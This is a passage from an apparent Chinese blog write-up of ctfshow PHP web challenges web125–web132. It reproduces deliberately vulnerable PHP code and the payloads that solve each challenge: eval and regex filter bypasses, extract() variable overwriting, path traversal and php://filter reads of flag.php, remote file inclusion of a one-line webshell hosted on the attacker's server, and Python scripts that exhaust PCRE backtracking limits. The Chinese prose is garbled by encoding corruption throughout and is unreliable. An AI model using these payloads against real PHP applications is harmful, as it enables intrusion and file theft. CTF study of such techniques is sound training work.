class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">         <span class="keyword">if</span>($fl0g===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> $flag;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Âú®‰∏ä‰∏ÄÈ¢òÂü∫Á°Ä‰∏äËøáÊª§‰∫ÜflagÂíåechoÂÖ≥ÈîÆÂ≠óÔºåÊàë‰ª¨ÂèØ‰ª•Áî®highlight_fileÊù•ÊòæÁ§∫Êñá‰ª∂ÔºåÂõ†‰∏∫flagË¢´Âú®post‰∏≠Ë¢´ban‰∫ÜÔºåÊàë‰ª¨ÈÄöËøágetÊù•‰º†ÂèÇÔºåÊâÄ‰ª•payload‰∏∫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?dotast&#x3D;flag.php</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;1&amp;fun&#x3D;highlight_file($_GET[dotast])</span><br></pre></td></tr></table></figure><h3 id="web126"><a class="header-anchor" href="#web126">¬∂</a>web126</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">$a=$_SERVER[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">$c=$_POST[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;</span>, $c) &amp;&amp; strlen($c)&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>($fl0g===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> $flag;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>ËøôÊ¨°Ê≠£ÂàôÂåπÈÖç‰∫Ü‰∏Ä‰∫õÂÖ≥ÈîÆÂ≠óÊØçÔºåÂØºËá¥‰∏çËÉΩÁªßÁª≠Áî®‰∏äÈ¢òpaylaodÔºõËßÇÂØüÂà∞ËøôÈáåÊòØÊúâ<code>$_SERVER['argv']</code></p><blockquote><p><code>$_SERVER['argv'][0] = $_SERVER['QUERY_STRING']</code><br>query stringÊòØUniform Resource Locator (URL)ÁöÑ‰∏ÄÈÉ®ÂàÜ, ÂÖ∂‰∏≠ÂåÖÂê´ÁùÄÈúÄË¶Å‰º†Áªôweb applicationÁöÑÊï∞ÊçÆ</p></blockquote><p>ËøôÈáåËøõË°å‰∫ÜÊú¨Âú∞ÊµãËØïÔºåÊ≥®ÊÑèÈúÄË¶ÅÂú®php.iniÂºÄÂêØregister_argc_argvÈÖçÁΩÆÈ°πÔºåÊµãËØï‰ª£Á†Å‰∏∫</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=$_SERVER[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web126/3%29X%28T_JR3%60AOE%25FJON%7D%5D%7BX2.png" alt=""></p><p>ÊâÄ‰ª•Â¶ÇÊûúÊàë‰ª¨get‰º†ÂÖ•ÂèòÈáèËµãÂÄºËØ≠Âè•ÔºåÊé•ÁùÄÂú®postÈáåÈù¢Êù•ÊâßË°åËøô‰∏™ËµãÂÄºËØ≠Âè•Â∞±ÂèØ‰ª•ÂÆåÁæéÁªïËøáÔºåpayload‰∏∫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?$fl0g&#x3D;flag_give_me;</span><br><span class="line"></span><br><span class="line">postÔºö</span><br><span class="line">CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;1&amp;fun&#x3D;eval($a[0])</span><br></pre></td></tr></table></figure><h3 id="web127"><a class="header-anchor" href="#web127">¬∂</a>web127</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$ctf_show = md5($flag);</span><br><span class="line">$url = $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="comment">//ÁâπÊÆäÂ≠óÁ¨¶Ê£ÄÊµã</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$url</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, $url))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(waf($url))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;ÂóØÂìºÔºü&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    extract($_GET);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($ctf_show===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>ËøôÈáåÂºÄÂêØ‰∫Ü<code>$_SERVER['QUERY_STRING']</code>Ôºå‰∏äÈ¢òÂ∑≤ÁªèËß£ÈáäËøáÔºåËøôÈáåÁî®‰∫Ü‰∏Ä‰∏™extract()ÂáΩÊï∞</p><blockquote><p><strong>extract()</strong> ÂáΩÊï∞‰ªéÊï∞ÁªÑ‰∏≠Â∞ÜÂèòÈáèÂØºÂÖ•Âà∞ÂΩìÂâçÁöÑÁ¨¶Âè∑Ë°®Ôºå‰ΩøÁî®Êï∞ÁªÑÈîÆÂêç‰Ωú‰∏∫ÂèòÈáèÂêçÔºå‰ΩøÁî®Êï∞ÁªÑÈîÆÂÄº‰Ωú‰∏∫ÂèòÈáèÂÄº</p></blockquote><p>‰∏æ‰æãÂ∞±ÊòØ<code>?a=2</code>ÔºåÂ∞±‰ºöÂèòÊàê<code>$a=2</code>ÔºåËøôÈáå<code>ctf_show</code>Êúâ‰∏™<code>_</code>ÈúÄË¶ÅÊûÑÈÄ†ÔºåÂâçÈù¢ËØ¥Ëøáphp‰∏≠ÂèòÈáèÂêçÂè™ÊúâÊï∞Â≠óÂ≠óÊØç‰∏ãÂàíÁ∫øÔºåË¢´getÊàñËÄÖpost‰º†ÂÖ•ÁöÑÂèòÈáèÂêçÔºåÂ¶ÇÊûúÂê´Êúâ<code>Á©∫Ê†º„ÄÅ+„ÄÅ[</code>Âàô‰ºöË¢´ËΩ¨Âåñ‰∏∫<code>_</code>ÔºåËøôÈáåÁ©∫Ê†ºÊ≤°ÊúâË¢´banÔºåÊâÄ‰ª•Êàë‰ª¨Â∞±‰ΩøÁî®Á©∫Ê†ºÔºåpayload‰∏∫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ctf show&#x3D;ilove36d</span><br></pre></td></tr></table></figure><h3 id="web128"><a class="header-anchor" href="#web128">¬∂</a>web128</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$f1 = $_GET[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line">$f2 = $_GET[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(check($f1))&#123;</span><br><span class="line">    var_dump(call_user_func(call_user_func($f1,$f2)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ÂóØÂìºÔºü&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !preg_match(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, $str);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>ËøôÈáåÂµåÂ•ó‰∫Ü‰∏§Â±ÇÁöÑcall_user_funcÔºåÂÖ≥‰∫écall_user_funcÂáΩÊï∞Âú®ÂâçÈù¢ÁöÑÈ¢ò‰∏≠Â∑≤ÁªèËÆ≤ËøáÔºå‰∏çËøáÊàë‰ª¨ÂèØ‰ª•ÂÜçÂõûÈ°æ‰∏Ä‰∏ãÔºåÂêåÊó∂‰ªãÁªçÊñ∞ÁöÑÁü•ËØÜÁÇπ</p><blockquote><p><strong>call_user_func()</strong> ÂáΩÊï∞ÊääÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞‰Ωú‰∏∫ÂõûË∞ÉÂáΩÊï∞ÔºåÂÖ∂‰ΩôÂèÇÊï∞ÈÉΩÊòØÂõûË∞ÉÂáΩÊï∞ÁöÑÂèÇÊï∞</p></blockquote><p>ËøôÈáåÂØπ<code>$f1</code>ËøõË°å‰∫ÜÊ≠£ÂàôËøáÊª§Ôºå‰∏çËÉΩ‰∏∫Êï∞Â≠óÂíåÂ≠óÊØçÔºåËøôÈáåÂèØ‰ª•‰ΩøÁî®gettextÊãìÂ±ïÔºåÂºÄÂêØÊ≠§ÊãìÂ±ï<code>_() Á≠âÊïà‰∫é gettext()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> gettext(<span class="string">&quot;ctfshownb&quot;</span>);</span><br><span class="line"><span class="comment">//ËæìÂá∫ÁªìÊûúÔºöctfshownb</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> _(<span class="string">&quot;ctfshownb&quot;</span>);</span><br><span class="line"><span class="comment">//ËæìÂá∫ÁªìÊûúÔºöctfshownb</span></span><br></pre></td></tr></table></figure><p>Âõ†Ê≠§<code>call_user_func('_','ctfshownb')</code> ËøîÂõûÁöÑÁªìÊûú‰∏∫ctfshownbÔºåÊé•‰∏ãÊù•Âà∞Á¨¨‰∫åÂ±Ç<code>call_user_func</code>ÔºåÊâæ‰∫Ü‰∏ÄÂúàÂèëÁé∞<code>get_defined_vars</code>ÂáΩÊï∞ÂèØ‰ª•‰ΩøÁî®</p><blockquote><p><strong>get_defined_vars ( void ) : array</strong> ÂáΩÊï∞ËøîÂõû‰∏Ä‰∏™ÂåÖÂê´ÊâÄÊúâÂ∑≤ÂÆö‰πâÂèòÈáèÂàóË°®ÁöÑÂ§öÁª¥Êï∞ÁªÑÔºåËøô‰∫õÂèòÈáèÂåÖÊã¨ÁéØÂ¢ÉÂèòÈáè„ÄÅÊúçÂä°Âô®ÂèòÈáèÂíåÁî®Êà∑ÂÆö‰πâÁöÑÂèòÈáè„ÄÇ</p></blockquote><p>ÊâÄ‰ª•payload‰πüÂ∞±Âá∫Êù•‰∫Ü</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f1&#x3D;_&amp;f2&#x3D;get_defined_vars</span><br></pre></td></tr></table></figure><p>Êï¥‰∏™ÊâßË°åÊµÅÁ®ãÂ∞±ÊòØ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(call_user_func(call_user_func($f1,$f2)));</span><br><span class="line">var_dump(call_user_func(call_user_func(_,&#39;get_defined_vars&#39;)));</span><br><span class="line">var_dump(call_user_func(get_defined_vars));&#x2F;&#x2F;ËæìÂá∫Êï∞ÁªÑ</span><br></pre></td></tr></table></figure><h3 id="web129"><a class="header-anchor" href="#web129">¬∂</a>web129</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    $f = $_GET[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stripos($f, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> readfile($f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>ÂÄíÊòØÂèòÂæóÁÆÄÂçï‰∫ÜÔºå‰º†ÂÖ•getÂèÇÊï∞fÔºåÂπ∂‰∏îÂ≠óÁ¨¶‰∏≤‰∏≠ÂåÖÂê´ctfshowÂ∞±‰ºöËØªÂèñÊñá‰ª∂ÔºåÊâÄ‰ª•ÊúâÂ§öÁßçÂà©Áî®ÂßøÂäøÔºåËøôÈáåËÆ≤Âá†Áßç<br><strong>Á¨¨‰∏ÄÁßç</strong><br>Áõ¥Êé•Êñá‰ª∂ÂåÖÂê´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f&#x3D;&#x2F;ctfshow&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÂè≥ÈîÆÊ∫êÁ†ÅÊü•Áúãflag<br><strong>Á¨¨‰∫åÁßç</strong><br>ËøúÁ®ãÊñá‰ª∂ÂåÖÂê´ÔºåÂú®Ëá™Â∑±ÁöÑÊúçÂä°Âô®‰∏äÂÜô‰∏ÄÂè•ËØùÊú®È©¨ËøõË°åÂà©Áî®Ôºåurl‰∏∫‰Ω†ÁöÑÊúçÂä°Âô®ipÊàñËÄÖÂüüÂêçÔºåxxxx.txt‰∏∫‰Ω†ÂÜôÁöÑ‰∏ÄÂè•ËØùÊú®È©¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f&#x3D;http:&#x2F;&#x2F;url&#x2F;xxxx.txt?ctfshow</span><br></pre></td></tr></table></figure><p><strong>Á¨¨‰∏âÁßç</strong><br>‰ΩøÁî®php‰º™ÂçèËÆÆËØªÂèñ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode|ctfshow&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><h3 id="web130"><a class="header-anchor" href="#web130">¬∂</a>web130</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    $f = $_POST[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, $f))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(stripos($f, <span class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>È¢ùÔºåËøôÈ¢òÁõ¥Êé•Â∞±ctfshowÂ∞±Ëøá‰∫ÜÔºåÂõ†‰∏∫Ê≠£ÂàôÊ®°ÂºèÂåπÈÖç‰∏çÂà∞ÔºåÁÑ∂Âêé<code>stripos()</code>ÊêúÁ¥¢Â≠óÁ¨¶‰∏≤ËøîÂõûÁöÑÂÄºÊòØ0(Âõ†‰∏∫ctfshowÁ¨¨‰∏ÄÊ¨°Âá∫Áé∞ÁöÑ‰ΩçÁΩÆÂ∞±ÊòØ0‰∏ãÊ†á)‰πüË∑≥Ëøá‰∫ÜifÈáåÁöÑËØ≠Âè•Áõ¥Êé•ËæìÂá∫flagÔºåÊâÄ‰ª•paylaod‰∏∫</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">post:</span><br><span class="line">f&#x3D;ctfshow</span><br></pre></td></tr></table></figure><p>‰ΩÜËøòÊòØËÆ≤‰∏Ä‰∏ãËøôÈ¢òÊú¨Êù•ÁöÑËÄÉÁÇπÔºåÊèêÁ§∫veryÂ∫îËØ•ËÄÉÁöÑÊòØÊ≠£ÂàôÁöÑÊúÄÂ§ßÂõûÊ∫Ø</p><blockquote><p>PHP ‰∏∫‰∫ÜÈò≤Ê≠¢Ê≠£ÂàôË°®ËææÂºèÁöÑÊãíÁªùÊúçÂä°ÊîªÂáªÔºàreDOSÔºâÔºåÁªô pcre ËÆæÂÆö‰∫Ü‰∏Ä‰∏™ÂõûÊ∫ØÊ¨°Êï∞‰∏äÈôê pcre.backtrack_limit<br>ÂõûÊ∫ØÊ¨°Êï∞‰∏äÈôêÈªòËÆ§ÊòØ 100 ‰∏á„ÄÇÂ¶ÇÊûúÂõûÊ∫ØÊ¨°Êï∞Ë∂ÖËøá‰∫Ü 100 ‰∏áÔºåpreg_match Â∞Ü‰∏çÂÜçËøîÂõûÈùû 1 Âíå 0ÔºåËÄåÊòØ false</p></blockquote><p>ÂÜô‰∏Ä‰∏™ËÑöÊú¨Êù•ÂèëÂåÖ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/27 17:52</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://48390078-c20a-4f56-8b4e-148df47485cb.chall.ctf.show:8080/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;dotast&#x27;</span>*<span class="number">170000</span>+<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url=url,data=data)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><h3 id="web131"><a class="header-anchor" href="#web131">¬∂</a>web131</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    $f = (<span class="keyword">String</span>)$_POST[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, $f))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(stripos($f,<span class="string">&#x27;36Dctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>ËøôÊ¨°Âä†‰∫ÜstringÂáΩÊï∞ÔºåÁî®‰∏äÈ¢òËÑöÊú¨Êîπ‰∏Ä‰∏ãÂ∞±ÂèØ‰ª•Ôºå‰∏ÄÊ†∑Âà©Áî®Ê≠£ÂàôÁöÑÂõûÊ∫ØÊ¨°Êï∞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/27 17:52</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://9b9aa879-e1b7-4f83-9c38-ea3132ac969b.chall.ctf.show:8080/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;dotast&#x27;</span>*<span class="number">170000</span>+<span class="string">&#x27;36Dctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url=url,data=data)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p>ËøêË°åËÑöÊú¨Âç≥ÂèØÂæóÂà∞flag</p><h3 id="web132"><a class="header-anchor" href="#web132">¬∂</a>web132</h3><p>ÊâìÂºÄÊòØ‰∏Ä‰∏™Âî¨‰∫∫ÁöÑÁΩëÈ°µ<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web132/VB1O0E%5D4QT%7DGFT84LA46C4V.png" alt=""><br>Âú®robots.txtÈáåÁúãÂà∞ÊèêÁ§∫admin<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web132/BHY24X%7D%7B8UE3%25KI9%29%7BHIC%7D7.png" alt=""><br>ËÆøÈóÆÂêéÁúãÂà∞Ê∫êÁ†Å<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web132/2PD47HLQ_YS5_%29MS%7BY18%25%25R.png" alt=""></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    $username = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    $password = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    $code = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($code === mt_rand(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; $password === $flag || $username ===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>($code == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>‰∏â‰∏™getÂèÇÊï∞ÔºåÂπ∂‰∏îÊúâ‰∏™ifÂà§Êñ≠Êù°‰ª∂ÔºõphpËøêÁÆóÁ¨¶‰ºòÂÖàÁ∫ß <code>||</code>‰ºòÂÖàÁ∫ß‰Ωé‰∫é<code>&amp;&amp;</code>ÔºåÁúã‰∏™ÁÆÄÂçï‰æãÂ≠ê</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">false</span> 